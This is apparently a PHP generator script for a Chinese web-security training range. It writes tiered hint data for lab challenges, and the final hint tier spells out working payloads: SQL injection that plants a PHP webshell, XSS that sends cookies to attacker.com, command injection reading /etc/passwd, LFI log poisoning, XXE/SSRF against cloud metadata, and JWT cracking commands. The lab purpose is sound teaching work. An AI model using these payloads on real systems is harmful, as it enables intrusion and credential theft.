<?php
/**
 * 修真靶场 - 提示数据批量生成器
 *
 * 为剩余 90 个关卡（炼气期 10 个已有数据）批量生成三级提示
 */

declare(strict_types=1);

$sql = file_get_contents(__DIR__ . '/database/seeds/02_challenges.sql');
preg_match_all("/\('([^']+)',\s*'([^']+)',\s*'(\w+)',\s*'(\w+)',\s*(\d+),\s*'([^']+)'/", $sql, $matches, PREG_SET_ORDER);

$inserts = [];
$count = 0;

foreach ($matches as $m) {
    $id = $m[1];
    $category = $m[6];
    $narrative = $m[7] ?? '';

    // 根据 category 生成对应的三级提示
    $hints = generateHintsForCategory($category);

    foreach ($hints as $level => $content) {
        $cost = $level === 1 ? 0 : ($level === 2 ? 5 : 15);
        $inserts[] = sprintf(
            "('%s', %d, '%s', %d, %d)",
            $id, $level, addslashes($content), $cost, $level
        );
        $count++;
    }
}

// 生成 INSERT 语句
$output = "-- ============================================================\n";
$output .= "-- 修真网络安全靶场 - 全部 100 关卡的三级提示数据\n";
$output .= "-- 由 generate_hints.php 自动生成\n";
$output .= "-- ============================================================\n\n";
$output .= "INSERT INTO `hints` (`challenge_id`, `level`, `content`, `point_cost`, `order_num`) VALUES\n";

// 拆分多个 INSERT（每个不超过约 1000 行）
$chunks = array_chunk($inserts, 500);
foreach ($chunks as $i => $chunk) {
    if ($i > 0) {
        $output .= "\nINSERT INTO `hints` (`challenge_id`, `level`, `content`, `point_cost`, `order_num`) VALUES\n";
    }
    $output .= implode(",\n", $chunk) . ";\n";
}

file_put_contents(__DIR__ . '/database/init/03_hints.sql', $output);
echo "✅ 已生成 {$count} 条提示数据到 database/init/03_hints.sql\n";

/**
 * 根据 category 生成三级提示
 */
function generateHintsForCategory(string $category): array
{
    $map = [
        'sqli_numeric' => [
            1 => '本关与用户输入的数值参数有关',
            2 => '检查 SQL 语句的数字型拼接漏洞，尝试 1 OR 1=1',
            3 => 'Payload: ?id=1 OR 1=1 -- 可绕过 SELECT * FROM users WHERE id=$id',
        ],
        'sqli_string' => [
            1 => '本关输入为字符串类型',
            2 => '需要闭合单引号才能注入，尝试 \' OR \'1\'=\'1',
            3 => 'Payload: ?name=admin\' OR \'1\'=\'1 -- -',
        ],
        'sqli_union' => [
            1 => '本关支持多表联合查询',
            2 => '使用 UNION SELECT 拼接新查询',
            3 => 'Payload: ?id=1\' UNION SELECT 1,version(),3-- -',
        ],
        'sqli_error' => [
            1 => '数据库错误信息会直接显示',
            2 => '利用 extractvalue() 或 updatexml() 函数触发错误',
            3 => 'Payload: ?id=1\' AND extractvalue(1,concat(0x7e,version()))-- -',
        ],
        'sqli_bool' => [
            1 => '页面只会显示存在或不存在两种状态',
            2 => '通过条件表达式逐字符推断',
            3 => 'Payload: ?name=admin\' AND SUBSTRING(password,1,1)=\'a',
        ],
        'sqli_time' => [
            1 => '查询条件会影响响应时间',
            2 => '使用 SLEEP() 函数触发延迟',
            3 => 'Payload: ?name=admin\' AND IF(1=1,SLEEP(5),0)-- -',
        ],
        'sqli_stacked' => [
            1 => '本关可能支持多语句执行',
            2 => '使用分号分隔多个 SQL 语句',
            3 => 'Payload: ?id=1\'; INSERT INTO logs(msg) VALUES(\'hacked\')-- -',
        ],
        'sqli_gbk' => [
            1 => '数据库使用 GBK 编码',
            2 => '宽字节 (\xbf\x27) 可吃掉 addslashes 添加的反斜杠',
            3 => 'Payload: ?id=%bf%27 OR 1=1-- -',
        ],
        'sqli_second' => [
            1 => '注册时输入的数据在后续查询中被使用',
            2 => '注册时构造恶意用户名（如 admin\'-- -），后续触发查询时注入',
            3 => '第一步：注册 username=admin\'-- ；第二步：用其他账号触发查询',
        ],
        'sqli_filter' => [
            1 => '服务端会过滤 union、select 等关键字',
            2 => '尝试双写（ununionion selselectect）或内联注释（/*!...*/）',
            3 => 'Payload: ?id=-1\' ununionion selselectect 1,2-- -',
        ],
        'sqli_waf' => [
            1 => '有 WAF 检测关键字',
            2 => '尝试大小写、内联注释、HTTP 参数污染',
            3 => 'Payload: ?id=-1\' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -',
        ],
        'sqli_multi' => [
            1 => 'mysqli_multi_query 支持多语句',
            2 => '使用分号分隔多个语句',
            3 => 'Payload: ?id=1; UPDATE demo_users SET balance=99999 WHERE id=1',
        ],
        'sqli_getshell' => [
            1 => '通过 SQL 注入写入 WebShell',
            2 => '使用 INTO OUTFILE 写入 PHP 文件到 web 目录',
            3 => 'Payload: ?id=1\' UNION SELECT \'<?php system($_GET[c]);?>\' INTO OUTFILE \'/var/www/html/shell.php\'',
        ],
        'sqli_comprehensive' => [
            1 => '本关需要综合运用多种 SQL 注入技术',
            2 => '从 UNION 注入到 GetShell 完整链路',
            3 => 'Payload: 通过 UNION 注入获取数据库路径 → INTO OUTFILE 写入 WebShell',
        ],
        'xss_reflected' => [
            1 => '本关输入会被原样回显',
            2 => '尝试在参数中插入 HTML/JavaScript',
            3 => 'Payload: ?msg=<script>alert(document.cookie)</script>',
        ],
        'xss_stored' => [
            1 => '留言会被持久化存储',
            2 => '提交的 XSS payload 会影响所有访问者',
            3 => '在留言中提交 <script>fetch("http://attacker.com/?c="+document.cookie)</script>',
        ],
        'xss_filter' => [
            1 => '服务端会过滤 < > 等字符',
            2 => '尝试 HTML 实体编码或 URL 编码',
            3 => 'Payload: ?msg=&lt;img src=x onerror=alert(1)&gt;',
        ],
        'xss_bypass' => [
            1 => '服务端使用 preg_replace 过滤 script',
            2 => '双写绕过、嵌套标签',
            3 => 'Payload: ?msg=<scrscriptipt>alert(1)</scrscriptipt>',
        ],
        'xss_dom' => [
            1 => '页面使用 innerHTML 处理 URL hash',
            2 => '在 URL # 后面插入 XSS payload',
            3 => 'Payload: ?page=x#<img src=x onerror=alert(1)>',
        ],
        'xss_cookie' => [
            1 => '本关演示 XSS 窃取 Cookie',
            2 => '配合接收端使用 fetch() 或 new Image() 发送 cookie',
            3 => 'Payload: <script>fetch("/steal?c="+document.cookie)</script>',
        ],
        'xss_comprehensive' => [
            1 => '本关需要综合运用反射型、存储型、DOM型 XSS',
            2 => '三种类型的触发机制各异，但都可窃取用户数据',
            3 => '综合 Payload：URL 参数 + 留言板 + DOM hash 三路触发',
        ],
        'csrf_get' => [
            1 => 'GET 请求会触发转账',
            2 => '利用 <img> 标签自动发送请求',
            3 => 'Payload: <img src="http://target/?transfer=1&to=attacker&amount=999">',
        ],
        'csrf_post' => [
            1 => 'POST 表单会被提交',
            2 => '构造自动提交表单',
            3 => 'Payload: <form action="http://target/transfer" method=POST><input name=amount value=999><script>form.submit()</script></form>',
        ],
        'csrf_token' => [
            1 => 'CSRF Token 是基于时间生成的，可被预测',
            2 => '观察多个 token 发现规律',
            3 => 'Payload: 直接构造 _token=md5(time()) 提交',
        ],
        'csrf_token_bypass' => [
            1 => 'CSRF Token 与 Session 绑定存在缺陷',
            2 => '尝试从其他用户的 session 提取 token',
            3 => 'Payload: 使用与目标相同的会话 token 提交请求',
        ],
        'csrf_comprehensive' => [
            1 => '本关需要绕过 Token + CORS + SameSite',
            2 => '综合运用多种 CSRF 绕过技术',
            3 => 'Payload: 抓取目标站 token 后跨域提交',
        ],
        'rce_basic' => [
            1 => 'IP 参数会进入 ping 命令',
            2 => '使用 ; 或 && 追加命令',
            3 => 'Payload: ?ip=127.0.0.1; ls /',
        ],
        'rce_space' => [
            1 => '过滤了空格字符',
            2 => '使用 ${IFS} 或 %09 代替空格',
            3 => 'Payload: ?ip=127.0.0.1;cat${IFS}/etc/passwd',
        ],
        'rce_filter' => [
            1 => '过滤了 cat、ls 等关键字',
            2 => '使用拼接（a=ca;b=t;$a$b）或通配符（c\\at）',
            3 => 'Payload: ?ip=127.0.0.1;c\\at /etc/passwd',
        ],
        'rce_comprehensive' => [
            1 => '本关过滤了多种关键字',
            2 => '使用无字母数字、base64、env等方式绕过',
            3 => 'Payload: ?ip=127.0.0.1;`$_`;$_=bash;$_<<<<\'id\'',
        ],
        'upload_js' => [
            1 => '仅前端 JS 校验上传',
            2 => '禁用 JS 或直接修改请求包',
            3 => 'Payload: 修改 Content-Type 或文件后缀，绕过前端校验',
        ],
        'upload_mime' => [
            1 => '服务端检查 Content-Type',
            2 => '伪造 Content-Type 为 image/jpeg',
            3 => 'Payload: 上传 .php 文件但 Content-Type 设为 image/jpeg',
        ],
        'upload_ext' => [
            1 => '服务端黑名单过滤 .php',
            2 => '使用 .php5、.phtml、.phar 等替代后缀',
            3 => 'Payload: 上传 shell.phtml 或 shell.php5',
        ],
        'upload_image' => [
            1 => '使用 getimagesize 验证图片',
            2 => '在真实图片中嵌入 PHP 代码（图片马）',
            3 => 'Payload: copy /b image.jpg + shell.php shell.jpg.php',
        ],
        'upload_htaccess' => [
            1 => '可以上传 .htaccess',
            2 => '上传 .htaccess 自定义解析',
            3 => 'Payload: 上传 AddType application/x-httpd-php .jpg',
        ],
        'upload_ntfs' => [
            1 => 'Windows NTFS 流可绕过检测',
            2 => '使用 filename.php::$DATA 后缀',
            3 => 'Payload: 上传 shell.php::$DATA (NTFS 备用数据流)',
        ],
        'lfi_basic' => [
            1 => 'file 参数会被直接 include',
            2 => '使用 ../ 跳出当前目录',
            3 => 'Payload: ?file=../../../../etc/passwd',
        ],
        'lfi_filter' => [
            1 => '可使用 PHP 伪协议',
            2 => 'php://filter 可读取 PHP 源码',
            3 => 'Payload: ?file=php://filter/convert.base64-encode/resource=index.php',
        ],
        'lfi_log_poison' => [
            1 => 'Apache 日志通常可读',
            2 => '通过 User-Agent 注入 PHP 代码到日志，再 LFI',
            3 => 'Payload: User-Agent: <?php system($_GET[c]);?>，然后 ?file=/var/log/apache2/access.log&c=id',
        ],
        'lfi_session' => [
            1 => 'Session 文件可被 LFI 包含',
            2 => '在 Session 中存储恶意代码',
            3 => 'Payload: 在 session 中写入 PHP 代码 → ?file=/var/lib/php/sessions/sess_xxx',
        ],
        'xxe_file' => [
            1 => 'XML 解析器未禁用外部实体',
            2 => '使用 SYSTEM 实体读取文件',
            3 => 'Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        'xxe_ssrf' => [
            1 => 'XXE 可访问内网',
            2 => '使用 SYSTEM 实体指向内网 URL',
            3 => 'Payload: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',
        ],
        'ssrf_basic' => [
            1 => 'URL 参数会发起服务端请求',
            2 => '使用 file:// 或 gopher:// 协议',
            3 => 'Payload: ?url=file:///etc/passwd 或 ?url=gopher://attacker.com/x',
        ],
        'ssrf_protocol' => [
            1 => '本关可使用 gopher:// 攻击内网',
            2 => '构造 Redis 未授权访问 payload',
            3 => 'Payload: ?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset...',
        ],
        'ssrf_rebind' => [
            1 => '可使用 DNS rebinding 绕过域名白名单',
            2 => '让 DNS 解析先返回合法 IP，再次请求返回内网 IP',
            3 => 'Payload: 设置 DNS TTL=0，配合 rebinding 服务',
        ],
        'ssrf_comprehensive' => [
            1 => '本关综合 SSRF 技术',
            2 => '内网探测 + Redis + 协议利用',
            3 => 'Payload: 探测 169.254.169.254 → gopher 攻击 Redis → 反弹 Shell',
        ],
        'deserialize_wakeup' => [
            1 => '__wakeup() 方法可被绕过',
            2 => '修改序列化字符串中的属性数量',
            3 => 'Payload: 修改 O:8:"DemoUser":2:{...} 为 O:8:"DemoUser":3:{...}',
        ],
        'deserialize_pop' => [
            1 => '需要构造 POP 链触发 RCE',
            2 => '寻找魔术方法调用链',
            3 => 'Payload: 利用多个类的 __destruct/__call/__get 串联调用 system()',
        ],
        'deserialize_phar' => [
            1 => 'Phar 文件可被反序列化触发',
            2 => '通过 file_exists() 等文件系统函数触发',
            3 => 'Payload: 上传恶意 phar → 触发 phar:// 协议 → 反序列化',
        ],
        'deserialize_session' => [
            1 => '不同序列化处理器有差异',
            2 => 'php_serialize vs php',
            3 => 'Payload: 利用序列化处理器差异触发注入',
        ],
        'deserialize_comprehensive' => [
            1 => '本关综合反序列化技术',
            2 => '__wakeup + POP 链 + Phar + Session',
            3 => 'Payload: 构造完整反序列化攻击链',
        ],
        'idor_horizontal' => [
            1 => '修改 URL 中的 id 参数',
            2 => '尝试 id=1, 2, 3... 访问他人数据',
            3 => 'Payload: ?order_id=2 访问他人订单',
        ],
        'idor_vertical' => [
            1 => '普通用户可访问管理后台',
            2 => '直接访问 /admin/ 路径',
            3 => 'Payload: GET /admin/users 无需鉴权',
        ],
        'payment_tamper' => [
            1 => '金额参数可被篡改',
            2 => '修改 POST 中的 price 字段',
            3 => 'Payload: 修改 amount=0.01 购买价值 10000 的商品',
        ],
        'captcha_reuse' => [
            1 => '验证码不失效可被重用',
            2 => '截获一次成功验证码后重复使用',
            3 => 'Payload: 抓取有效 captcha → 多个请求重用',
        ],
        'password_reset' => [
            1 => '通过邮箱可重置任意账号密码',
            2 => '修改请求中的 email 参数',
            3 => 'Payload: POST /reset email=victim@example.com → 新密码泄露',
        ],
        'brute_force' => [
            1 => '无失败次数限制',
            2 => '使用字典或 Hydra 暴力破解',
            3 => 'Payload: 使用 Burp Suite Intruder 模块爆破 admin:123456',
        ],
        'jwt_none' => [
            1 => 'JWT 支持 alg=none',
            2 => '修改 token header 的 alg 为 none',
            3 => 'Payload: 修改 JWT header {"alg":"none"}，删除签名',
        ],
        'jwt_weak' => [
            1 => 'JWT 密钥可被爆破',
            2 => '使用 hashcat/john 配合字典爆破',
            3 => 'Payload: hashcat -m 16500 jwt.txt wordlist.txt',
        ],
        'jwt_kid' => [
            1 => 'kid 字段可被注入',
            2 => 'SQL 注入或路径穿越',
            3 => 'Payload: 修改 kid=../../../dev/null 或 kid=\' OR 1=1-- -',
        ],
        'oauth_redirect' => [
            1 => 'redirect_uri 未严格校验',
            2 => '使用开放重定向绕过',
            3 => 'Payload: redirect_uri=http://attacker.com/callback?code=xxx',
        ],
        'cors' => [
            1 => 'Access-Control-Allow-Origin: * 配合 Credentials',
            2 => '利用 CORS 配置读取跨域数据',
            3 => 'Payload: 受害者访问 attacker.com → fetch(target) withCredentials=true',
        ],
        'http_smuggle' => [
            1 => '前后端对 Content-Length 解析不一致',
            2 => '构造 CL-TE 走私请求',
            3 => 'Payload: Content-Length + Transfer-Encoding 双重声明',
        ],
        'cache_poison' => [
            1 => '缓存键未完全覆盖请求差异',
            2 => '通过 URL 参数注入缓存投毒',
            3 => 'Payload: /page?evil=<script>alert(1)</script>',
        ],
        'cache_poison_adv' => [
            1 => '高级缓存投毒',
            2 => '通过 X-Forwarded-Host 等头注入',
            3 => 'Payload: X-Forwarded-Host: evil.com',
        ],
        'crypto_ecb' => [
            1 => 'AES-ECB 模式块独立加密',
            2 => '通过重排密文块改变明文',
            3 => 'Payload: 重排密文块顺序 → 解密得到重排的明文',
        ],
        'crypto_hash_ext' => [
            1 => '服务端使用 H(secret || message) 而非 HMAC',
            2 => '使用 hashpump 工具构造扩展',
            3 => 'Payload: hashpump -d 原签名 -a 附加数据 -s secret_length -k secret_length',
        ],
        'crypto_comprehensive' => [
            1 => '本关综合密码学漏洞',
            2 => 'ECB + Hash 扩展 + JWT + Padding Oracle',
            3 => 'Payload: 综合运用多种密码学攻击',
        ],
        'php_type_juggle' => [
            1 => '使用 == 进行弱类型比较',
            2 => '"0e123" == "0e456" 都被解释为 0',
            3 => 'Payload: 提交 password=0e123 绕过 "0 == 0" 比较',
        ],
        'php_variable' => [
            1 => '使用 extract($_GET) 导致变量覆盖',
            2 => '通过 GET 参数覆盖内部变量',
            3 => 'Payload: ?role=admin&is_admin=1 覆盖 role 变量',
        ],
        'php_in_array' => [
            1 => 'in_array 第三个参数默认为 false',
            2 => '"admin" == 0 == "admin1" 都为真',
            3 => 'Payload: role=admin1 绕过白名单',
        ],
        'php_strcmp' => [
            1 => 'strcmp 接收数组返回 NULL',
            2 => 'NULL == 0 为真',
            3 => 'Payload: POST password[]=1 触发 NULL 返回',
        ],
        'php_cgi' => [
            1 => 'PHP-CGI 存在 CVE-2024-4577 漏洞',
            2 => '使用畸形参数覆盖 php.ini 配置',
            3 => 'Payload: ?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
        ],
        'container_escape' => [
            1 => 'Docker 容器逃逸',
            2 => '特权模式挂载 /proc 或宿主文件系统',
            3 => 'Payload: 通过特权模式 + 挂载点获取宿主机 shell',
        ],
        'code_review' => [
            1 => '审计一个迷你 CMS',
            2 => 'SQL 注入 + XSS + 文件上传',
            3 => 'Payload: 综合审计 CMS 源码找出漏洞',
        ],
        'auth_comprehensive' => [
            1 => '本关综合认证漏洞',
            2 => '会话固定 + JWT + 密码重置',
            3 => 'Payload: 综合利用多种认证漏洞',
        ],
        'logic_comprehensive' => [
            1 => '本关综合业务逻辑漏洞',
            2 => '支付 + 并发 + 状态机绕过',
            3 => 'Payload: 综合利用业务逻辑漏洞',
        ],
        'open_redirect' => [
            1 => 'URL 参数会重定向',
            2 => '修改 url 参数指向外部',
            3 => 'Payload: ?url=http://evil.com',
        ],
        'clickjacking' => [
            1 => '页面未禁止 iframe 嵌入',
            2 => '使用透明 iframe 覆盖诱饵',
            3 => 'Payload: <iframe src="target" style="opacity:0.1">',
        ],
        'file_read' => [
            1 => 'file 参数可读取任意文件',
            2 => '目录穿越',
            3 => 'Payload: ?file=../../../../etc/passwd',
        ],
    ];

    return $map[$category] ?? [
        1 => '本关与该漏洞类型有关',
        2 => '仔细分析源码寻找攻击点',
        3 => '根据漏洞类型构造相应 payload',
    ];
}